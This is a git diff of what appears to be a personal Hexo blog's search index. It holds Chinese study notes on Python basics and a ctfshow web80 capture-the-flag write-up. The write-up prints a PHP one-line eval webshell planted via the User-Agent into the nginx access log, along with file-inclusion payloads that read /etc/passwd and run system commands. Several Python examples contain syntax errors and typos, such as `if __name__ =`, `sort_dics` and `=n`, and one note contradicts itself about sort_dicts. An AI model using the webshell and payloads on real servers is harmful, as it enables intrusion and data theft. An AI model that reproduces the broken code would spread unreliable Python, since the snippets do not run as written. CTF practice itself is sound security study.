-    <content><![CDATA[<h1 id="常规程序启动入口"><a href="#常规程序启动入口" class="headerlink" title="常规程序启动入口"></a>常规程序启动入口</h1><h2 id="name-启动程序"><a href="#name-启动程序" class="headerlink" title="__name__启动程序"></a><code>__name__</code>启动程序</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ = <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    data : <span class="built_in">dict</span> = load_toml()</span><br><span class="line">    pprint(data,sort_dics=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
-
-<h3 id="代码逐行解释"><a href="#代码逐行解释" class="headerlink" title="代码逐行解释"></a>代码逐行解释</h3><h4 id="if-name-main"><a href="#if-name-main" class="headerlink" title="if __name__ == &#39;__main__&#39;:"></a><code>if __name__ == &#39;__main__&#39;:</code></h4><ul>
-<li><p><code>__name__</code> 变量：</p>
-</li>
-<li><p>在 Python 中，每个模块（即<code>.py</code>文件）都有一个内置的<code>__name__</code>变量。这个变量的值取决于模块是如何被使用的。</p>
-<ul>
-<li><strong>当一个 Python 脚本作为主程序直接运行时</strong>，例如<strong>在命令行中使用 <code>python script.py</code> 来执行脚本</strong>，该脚本的 <code>__name__</code> 变量会被自动设置为 <code>&#39;__main__&#39;</code>。</li>
-<li><strong>当一个 Python 脚本作为模块被其他脚本导入时</strong>，例如在 <code>another_script.py</code> 中使用 <code>import script</code>，那么 <code>script.py</code> 模块的 <code>__name__</code> 变量会被设置为该模块的名称（即 <code>&#39;script&#39;</code>）。</li>
-</ul>
-</li>
-<li><p><strong>条件判断</strong>：<code>if __name__ == &#39;__main__&#39;:</code> 这行代码的作用是检查当前脚本是否作为主程序直接运行。如果是，则执行下面缩进的代码块；如果脚本是作为模块被导入到其他脚本中，则不会执行该代码块。这种机制允许我们在一个脚本中既定义可复用的函数和类，又可以包含用于测试或直接执行的代码，同时避免在被导入时执行这些测试代码。</p>
-</li>
-</ul>
-<h4 id="data-dict-load-toml"><a href="#data-dict-load-toml" class="headerlink" title="data: dict = load_toml()"></a><code>data: dict = load_toml()</code></h4><ul>
-<li><strong>类型注解</strong>：<code>data: dict</code> 是 Python 的类型注解，它告诉开发者（以及一些静态类型检查工具，如 <code>mypy</code>）变量 <code>data</code> 预期的类型是字典（<code>dict</code>）。类型注解不会影响代码的实际运行，但可以提高代码的可读性和可维护性。</li>
-<li><strong>函数调用</strong>：<code>load_toml()</code> 是之前定义的函数，用于读取并解析 <code>config.toml</code> 文件。调用该函数会返回一个包含解析后 TOML 数据的字典，这个字典会被赋值给变量 <code>data</code>。</li>
-</ul>
-<h4 id="pprint-data-sort-dicts-False"><a href="#pprint-data-sort-dicts-False" class="headerlink" title="pprint(data, sort_dicts=False)"></a><code>pprint(data, sort_dicts=False)</code></h4><ul>
-<li><strong><code>pprint</code> 函数</strong>：<code>pprint</code> 是 Python 标准库 <code>pprint</code> 模块中的一个函数，用于以美观的格式打印复杂的数据结构，如嵌套的字典和列表。相比于普通的 <code>print</code> 函数，<code>pprint</code> 会对数据进行格式化，使其更易于阅读。</li>
-<li><strong><code>sort_dicts=False</code> 参数</strong>：在 Python 3.8 及以上版本中，<code>pprint</code> 函数默认会对字典的键进行排序后再打印。通过设置 <code>sort_dicts=False</code>，我们告诉 <code>pprint</code> 函数不要对字典的键进行排序，**(其实就是对字典的键按照字母顺序排序)**而是按照字典中键的原始顺序进行打印。这样可以保留 TOML 文件中键值对的原始顺序。即没有用字母顺序排序。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>py程序启动</tag>
       </tags>
   </entry>
   <entry>
@@ -2876,6 +2862,107 @@ for func in functions:
       </tags>
   </entry>
   <entry>
+    <title>python程序运行启动代码</title>
+    <url>/2025/01/26/python%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E5%90%AF%E5%8A%A8%E4%BB%A3%E7%A0%81/</url>
+    <content><![CDATA[<h1 id="常规程序启动入口"><a href="#常规程序启动入口" class="headerlink" title="常规程序启动入口"></a>常规程序启动入口</h1><h2 id="name-启动程序"><a href="#name-启动程序" class="headerlink" title="__name__启动程序"></a><code>__name__</code>启动程序</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ = <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    data : <span class="built_in">dict</span> = load_toml()</span><br><span class="line">    pprint(data,sort_dics=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="代码逐行解释"><a href="#代码逐行解释" class="headerlink" title="代码逐行解释"></a>代码逐行解释</h3><h4 id="if-name-main"><a href="#if-name-main" class="headerlink" title="if __name__ == &#39;__main__&#39;:"></a><code>if __name__ == &#39;__main__&#39;:</code></h4><ul>
+<li><p><code>__name__</code> 变量：</p>
+</li>
+<li><p>在 Python 中，每个模块（即<code>.py</code>文件）都有一个内置的<code>__name__</code>变量。这个变量的值取决于模块是如何被使用的。</p>
+<ul>
+<li><strong>当一个 Python 脚本作为主程序直接运行时</strong>，例如<strong>在命令行中使用 <code>python script.py</code> 来执行脚本</strong>，该脚本的 <code>__name__</code> 变量会被自动设置为 <code>&#39;__main__&#39;</code>。</li>
+<li><strong>当一个 Python 脚本作为模块被其他脚本导入时</strong>，例如在 <code>another_script.py</code> 中使用 <code>import script</code>，那么 <code>script.py</code> 模块的 <code>__name__</code> 变量会被设置为该模块的名称（即 <code>&#39;script&#39;</code>）。</li>
+</ul>
+</li>
+<li><p><strong>条件判断</strong>：<code>if __name__ == &#39;__main__&#39;:</code> 这行代码的作用是检查当前脚本是否作为主程序直接运行。如果是，则执行下面缩进的代码块；如果脚本是作为模块被导入到其他脚本中，则不会执行该代码块。这种机制允许我们在一个脚本中既定义可复用的函数和类，又可以包含用于测试或直接执行的代码，同时避免在被导入时执行这些测试代码。</p>
+</li>
+</ul>
+<h4 id="data-dict-load-toml"><a href="#data-dict-load-toml" class="headerlink" title="data: dict = load_toml()"></a><code>data: dict = load_toml()</code></h4><ul>
+<li><strong>类型注解</strong>：<code>data: dict</code> 是 Python 的类型注解，它告诉开发者（以及一些静态类型检查工具，如 <code>mypy</code>）变量 <code>data</code> 预期的类型是字典（<code>dict</code>）。类型注解不会影响代码的实际运行，但可以提高代码的可读性和可维护性。</li>
+<li><strong>函数调用</strong>：<code>load_toml()</code> 是之前定义的函数，用于读取并解析 <code>config.toml</code> 文件。调用该函数会返回一个包含解析后 TOML 数据的字典，这个字典会被赋值给变量 <code>data</code>。</li>
+</ul>
+<h4 id="pprint-data-sort-dicts-False"><a href="#pprint-data-sort-dicts-False" class="headerlink" title="pprint(data, sort_dicts=False)"></a><code>pprint(data, sort_dicts=False)</code></h4><ul>
+<li><strong><code>pprint</code> 函数</strong>：<code>pprint</code> 是 Python 标准库 <code>pprint</code> 模块中的一个函数，用于以美观的格式打印复杂的数据结构，如嵌套的字典和列表。相比于普通的 <code>print</code> 函数，<code>pprint</code> 会对数据进行格式化，使其更易于阅读。</li>
+<li><strong><code>sort_dicts=False</code> 参数</strong>：在 Python 3.8 及以上版本中，<code>pprint</code> 函数默认会对字典的键进行排序后再打印。通过设置 <code>sort_dicts=False</code>，我们告诉 <code>pprint</code> 函数不要对字典的键进行排序，**(其实就是对字典的键按照字母顺序排序)**而是按照字典中键的原始顺序进行打印。这样可以保留 TOML 文件中键值对的原始顺序。即没有用字母顺序排序。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>py程序启动</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python装饰器</title>
+    <url>/2025/03/20/python%E8%A3%85%E9%A5%B0%E5%99%A8/</url>
+    <content><![CDATA[<h1 id="classmethod"><a href="#classmethod" class="headerlink" title="@classmethod"></a>@classmethod</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><ul>
+<li><p><code>@classmethod</code> 是 Python 中的一个装饰器，作用是把一个方法封装成类方法 。</p>
+</li>
+<li><p>类方法是什么，就是可以直接使用类，无需实例化调用的方法叫做类方法。</p>
+</li>
+<li><p>比如:</p>
+</li>
+<li><pre><code class="language-python">class DateUtils:    
+    @classmethod
+    def get_time(cls):
+        import datetime
+        return datetime.datetime.now()
+ 
+#类调用
+year1 = DateUtils.get_time
+print(year1)
+
+#实例化后调用
+date = DateUtils()
+year2 =n date.get_time
+print(year2)
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># @model_validator(mode=&quot;&quot;)(pydantic库)</span><br><span class="line"></span><br><span class="line">## 可输入参数:</span><br><span class="line"></span><br><span class="line">* `before`和`after`</span><br><span class="line"></span><br><span class="line">* 区别如下:</span><br><span class="line"></span><br><span class="line">  - `@model_validator(mode=&quot;before&quot;)` 在`pydantic`模型进行内置类型和约束验证前执行 ，处理的是原始输入数据，通常为字典形式。可以对数据进行转换，如将字符串转为数字，还能进行数据清理等操作，之后返回处理过的字典供后续验证。比如输入的日期是多种字符串格式，可在`before`验证中统一转换为指定日期格式。</span><br><span class="line"></span><br><span class="line">  - `@model_validator(mode=&quot;after&quot;)` 在模型完成内置验证后执行，此时面对的是已经初步验证通过的模型实例对象，不能对数据来源进行转换，但能基于完整的实例对象做进一步检查。</span><br><span class="line"></span><br><span class="line">  - 通俗地来说`@model_validator`中参数为`before`时该模型中的检查方法更倾向于对输入格式的检查和转换</span><br><span class="line"></span><br><span class="line">  - 而后者，即参数为`after`的时候，更加倾向于在数据格式都毫无疑问的时候，单纯对数据大小关系进行检查，其重点没有放在格式上面，而是数值关系，所以叫`after`。</span><br><span class="line"></span><br><span class="line">    ```python</span><br><span class="line">    from pydantic import BaseModel, model_validator</span><br><span class="line">    </span><br><span class="line">    class TimeInterval(BaseModel):</span><br><span class="line">        start_time: int</span><br><span class="line">        end_time: int</span><br><span class="line">    </span><br><span class="line">        @model_validator(mode=&quot;after&quot;)</span><br><span class="line">        def check_time_order(cls, instance):</span><br><span class="line">            if instance.start_time &gt;= instance.end_time:</span><br><span class="line">                raise ValueError(&quot;开始时间必须早于结束时间&quot;)</span><br><span class="line">            return instance</span><br><span class="line">    </span><br><span class="line">    # 测试</span><br><span class="line">    try:</span><br><span class="line">        time_data = &#123;&quot;start_time&quot;: 1672531200, &quot;end_time&quot;: 1672534800&#125;#直接验证数值大小</span><br><span class="line">        time_interval = TimeInterval(**time_data)</span><br><span class="line">        print(time_interval)</span><br><span class="line">    except ValueError as e:</span><br><span class="line">        print(f&quot;验证失败: &#123;e&#125;&quot;)</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>python装饰器</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python读取文件</title>
+    <url>/2025/01/26/python%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<h1 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h1><h2 id="使用with方法读取文件"><a href="#使用with方法读取文件" class="headerlink" title="使用with方法读取文件"></a>使用with方法读取文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tomllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./config.toml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = tomllib.load(f)</span><br></pre></td></tr></table></figure>
+
+<p>把打开的文件对象赋值给 <code>f</code>，并不是将以二进制形式只读打开后的文件内容赋值给 <code>f</code>，下面为你详细解释。</p>
+<h3 id="文件对象的概念"><a href="#文件对象的概念" class="headerlink" title="文件对象的概念"></a>文件对象的概念</h3><p>在 Python 里，当使用 <code>open()</code> 函数打开一个文件时，它会返回一个文件对象。文件对象可以理解为是 Python 程序与实际存储在磁盘上的文件之间的一个 “桥梁” 或者 “通道”，借助这个文件对象，我们可以对文件执行各种操作，像读取文件内容、向文件写入内容等。</p>
+<p>**相当于意思就是:**当我们使用open对一个文件打开之后,那就是我们告诉代码,我们已经选中这个文件了哦,把它赋值给f,意思就是:</p>
+<p><strong>f</strong>代表了这个已经被二进制形式打开的文件</p>
+<h3 id="赋值操作的含义"><a href="#赋值操作的含义" class="headerlink" title="赋值操作的含义"></a>赋值操作的含义</h3><p><code>with open(&#39;./config.toml&#39;, &#39;rb&#39;) as f:</code> 这行代码中的 <code>as f</code>，是把 <code>open()</code> 函数返回的文件对象赋值给变量 <code>f</code>。也就是说，变量 <code>f</code> 现在代表着这个打开的文件，通过 <code>f</code> 可以对文件进行相关操作，而不是把文件的内容赋值给 <code>f</code>。</p>
+<h3 id="对比文件对象和文件内容"><a href="#对比文件对象和文件内容" class="headerlink" title="对比文件对象和文件内容"></a>对比文件对象和文件内容</h3><ul>
+<li><strong>文件对象</strong>：它是一个具有多种方法和属性的 Python 对象，能够让我们和文件进行交互。例如，通过文件对象可以调用 <code>read()</code> 方法读取文件内容、<code>write()</code> 方法写入文件内容、<code>close()</code> 方法关闭文件等。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># f 是文件对象</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(f))  <span class="comment"># 输出 &lt;class &#x27;_io.TextIOWrapper&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>文件内容</strong>：指的是存储在文件中的实际数据。要获取文件内容，需要调用文件对象的读取方法，比如 <code>read()</code>、<code>readline()</code> 或者 <code>readlines()</code> 等。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># 通过文件对象 f 的 read() 方法读取文件内容</span></span><br><span class="line">    content = f.read()</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br></pre></td></tr></table></figure>
+
+<h3 id="结合-tomllib-的例子"><a href="#结合-tomllib-的例子" class="headerlink" title="结合 tomllib 的例子"></a>结合 <code>tomllib</code> 的例子</h3><p>在使用 <code>tomllib.load(f)</code> 时，<code>f</code> 是文件对象，<code>tomllib.load()</code> 函数会通过这个文件对象去读取文件中的内容，并将其解析成 Python 字典。这里传递的是文件对象，而不是文件内容。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tomllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;config.toml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># f 是文件对象</span></span><br><span class="line">    data = tomllib.load(f)  <span class="comment"># tomllib.load() 通过文件对象 f 读取并解析文件内容</span></span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>
+
+<p>综上所述，把打开的文件对象赋值给 <code>f</code> 后，<code>f</code> 代表着与文件进行交互的接口，而不是文件的实际内容。要获取文件内容，需要使用文件对象提供的读取方法。</p>
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>python读取文件</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>re库</title>
     <url>/2025/03/01/re%E5%BA%93/</url>
     <content><![CDATA[<h1 id="r前缀"><a href="#r前缀" class="headerlink" title="r前缀"></a>r前缀</h1><h2 id="原始字符串和普通字符串"><a href="#原始字符串和普通字符串" class="headerlink" title="原始字符串和普通字符串"></a>原始字符串和普通字符串</h2><h3 id="普通字符串"><a href="#普通字符串" class="headerlink" title="普通字符串"></a>普通字符串</h3><ul>
@@ -2929,36 +3016,9 @@ print(result.group())
       </tags>
   </entry>
   <entry>
-    <title>python读取文件</title>
-    <url>/2025/01/26/python%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/</url>
-    <content><![CDATA[<h1 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h1><h2 id="使用with方法读取文件"><a href="#使用with方法读取文件" class="headerlink" title="使用with方法读取文件"></a>使用with方法读取文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tomllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./config.toml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = tomllib.load(f)</span><br></pre></td></tr></table></figure>
-
-<p>把打开的文件对象赋值给 <code>f</code>，并不是将以二进制形式只读打开后的文件内容赋值给 <code>f</code>，下面为你详细解释。</p>
-<h3 id="文件对象的概念"><a href="#文件对象的概念" class="headerlink" title="文件对象的概念"></a>文件对象的概念</h3><p>在 Python 里，当使用 <code>open()</code> 函数打开一个文件时，它会返回一个文件对象。文件对象可以理解为是 Python 程序与实际存储在磁盘上的文件之间的一个 “桥梁” 或者 “通道”，借助这个文件对象，我们可以对文件执行各种操作，像读取文件内容、向文件写入内容等。</p>
-<p>**相当于意思就是:**当我们使用open对一个文件打开之后,那就是我们告诉代码,我们已经选中这个文件了哦,把它赋值给f,意思就是:</p>
-<p><strong>f</strong>代表了这个已经被二进制形式打开的文件</p>
-<h3 id="赋值操作的含义"><a href="#赋值操作的含义" class="headerlink" title="赋值操作的含义"></a>赋值操作的含义</h3><p><code>with open(&#39;./config.toml&#39;, &#39;rb&#39;) as f:</code> 这行代码中的 <code>as f</code>，是把 <code>open()</code> 函数返回的文件对象赋值给变量 <code>f</code>。也就是说，变量 <code>f</code> 现在代表着这个打开的文件，通过 <code>f</code> 可以对文件进行相关操作，而不是把文件的内容赋值给 <code>f</code>。</p>
-<h3 id="对比文件对象和文件内容"><a href="#对比文件对象和文件内容" class="headerlink" title="对比文件对象和文件内容"></a>对比文件对象和文件内容</h3><ul>
-<li><strong>文件对象</strong>：它是一个具有多种方法和属性的 Python 对象，能够让我们和文件进行交互。例如，通过文件对象可以调用 <code>read()</code> 方法读取文件内容、<code>write()</code> 方法写入文件内容、<code>close()</code> 方法关闭文件等。</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># f 是文件对象</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(f))  <span class="comment"># 输出 &lt;class &#x27;_io.TextIOWrapper&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>文件内容</strong>：指的是存储在文件中的实际数据。要获取文件内容，需要调用文件对象的读取方法，比如 <code>read()</code>、<code>readline()</code> 或者 <code>readlines()</code> 等。</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># 通过文件对象 f 的 read() 方法读取文件内容</span></span><br><span class="line">    content = f.read()</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br></pre></td></tr></table></figure>
-
-<h3 id="结合-tomllib-的例子"><a href="#结合-tomllib-的例子" class="headerlink" title="结合 tomllib 的例子"></a>结合 <code>tomllib</code> 的例子</h3><p>在使用 <code>tomllib.load(f)</code> 时，<code>f</code> 是文件对象，<code>tomllib.load()</code> 函数会通过这个文件对象去读取文件中的内容，并将其解析成 Python 字典。这里传递的是文件对象，而不是文件内容。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tomllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;config.toml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># f 是文件对象</span></span><br><span class="line">    data = tomllib.load(f)  <span class="comment"># tomllib.load() 通过文件对象 f 读取并解析文件内容</span></span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>
-
-<p>综上所述，把打开的文件对象赋值给 <code>f</code> 后，<code>f</code> 代表着与文件进行交互的接口，而不是文件的实际内容。要获取文件内容，需要使用文件对象提供的读取方法。</p>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>python读取文件</tag>
-      </tags>
+    <title>sqlite库学习</title>
+    <url>/2025/03/05/sqlite%E5%BA%93%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>sql常规注入</title>
@@ -2970,11 +3030,6 @@ print(result.group())
       <tags>
         <tag>sql注入</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>sqlite库学习</title>
-    <url>/2025/03/05/sqlite%E5%BA%93%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>toml配置文件</title>
@@ -2992,54 +3047,6 @@ print(result.group())
       </categories>
       <tags>
         <tag>toml配置文件</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>一句话木马简单例题web80</title>
-    <url>/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
-    <content><![CDATA[<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h4 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h4><p>这道题把协议也过滤,比如说php,data协议,所以我们可以使用一句话协议木马,比如:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
-<h4 id="木马分析："><a href="#木马分析：" class="headerlink" title="木马分析："></a>木马分析：</h4><h5 id="插入位置"><a href="#插入位置" class="headerlink" title="插入位置:"></a>插入位置:</h5><p>1.首先，我们需要知道日志的位置,日志文件根据服务器的配置不同,先要了解服务器是nginx还是apache,然后再去查看日志文件位置。<br>payloads:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=/etc/passwd</span><br></pre></td></tr></table></figure>
-<p>可以发现回显<br>2.然后通过nginx日志默认路径打开日志文件:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
-<p>3.将payloads写入日志文件:<br>为什么要在UA(user-agent)中写入payloads?因为UA是浏览器的标识符,方便隐藏。<br>如图:</p>
-<img src="/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image.png" class="" title="image">
-
-<h5 id="url中远程文件包含触发"><a href="#url中远程文件包含触发" class="headerlink" title="url中远程文件包含触发:"></a>url中远程文件包含触发:</h5><p>写入payloads:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log&amp;1=system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
-<p>先调出文件:</p>
-<img src="/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-1.png" class="" title="image-1">
-
-<p>然后再查看日志文件:<br>写入payloads:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log&amp;1=system(&quot;cat fl0g.php&quot;);</span><br></pre></td></tr></table></figure>
-<p>嘻嘻,其实不行,要用URL编码:就是要把cat fl0g.php进行编码才可以,<br>这里存疑,为什么要用URL编码?之前system(“ls”)不用编码,为什么这里要编码?<br>应该写作：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=/var/log/nginx/access.log&amp;1=system(%22cat%20fl0g.php%22)%3</span><br></pre></td></tr></table></figure>
-<p>才可以利用repeater回显:</p>
-<img src="/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-1-1736824226811-3-1736824231038-5.png" class="" title="image-1">
-
-<p><strong>这个点还是需要解决!</strong><br>我现在传参还是优先用URL编码传参罢</p>
-]]></content>
-      <categories>
-        <category>ctfshow web</category>
-      </categories>
-      <tags>
-        <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>个人学习感悟</title>
-    <url>/2025/03/30/%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E6%84%9F%E6%82%9F/</url>
-    <content><![CDATA[<h1 id="关于python库的学习"><a href="#关于python库的学习" class="headerlink" title="关于python库的学习"></a>关于python库的学习</h1><ul>
-<li>在学习的时候是缺什么学什么，不是一口气把库里面的东西走完，包括<code>re</code>这种自带的小库</li>
-</ul>
-]]></content>
-      <categories>
-        <category>个人安排</category>
-      </categories>
-      <tags>
-        <tag>感悟</tag>
       </tags>
   </entry>
   <entry>
@@ -3140,6 +3147,71 @@ print(result.group())
       </categories>
       <tags>
         <tag>transformer</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>一句话木马简单例题web80</title>
+    <url>/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
+    <content><![CDATA[<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><p>这道题把协议也过滤,比如说php,data协议,所以我们可以使用一句话协议木马,比如:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="基本原理解释"><a href="#基本原理解释" class="headerlink" title="基本原理解释"></a>基本原理解释</h2><ul>
+<li>一句话说完:木马病毒的本质就是在服务器某个文件中插入<strong>一段可执行代码</strong>,然后我们通过技术手段如前端传参来发送如<code>POST</code>和<code>GET</code>请求来让该代码在服务器中得到执行从而使我们可以得到服务器控制权。</li>
+<li>具体思路:<img src="/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E7%A8%8B.jpg" class="" title="一句话木马流程"></li>
+<li>细节解释:<ul>
+<li>首先，我们需要将这个木马写在服务器的某个文件中，由于写在<code>User-Agent</code>中的文本会在请求被提交的时候自动写入日志文件，所以这是一个突破口，我们可以在初始链接被抓包的时候就在<code>User-Agent</code>中写入木马指令。</li>
+<li>该木马指令被写入日志文件<code>/var/log/nginx/access.log</code>后,只是作为普通文本文件存在，不会被解析为<code>php</code>代码，当该日志文件被<code>include</code>函数解析后,<code>include</code>函数会将日志文件中的<code>php</code>指令解析，并将非代码指令文本输出,<code>php</code>代码被解析执行后，我们就可以执行下一步工作。</li>
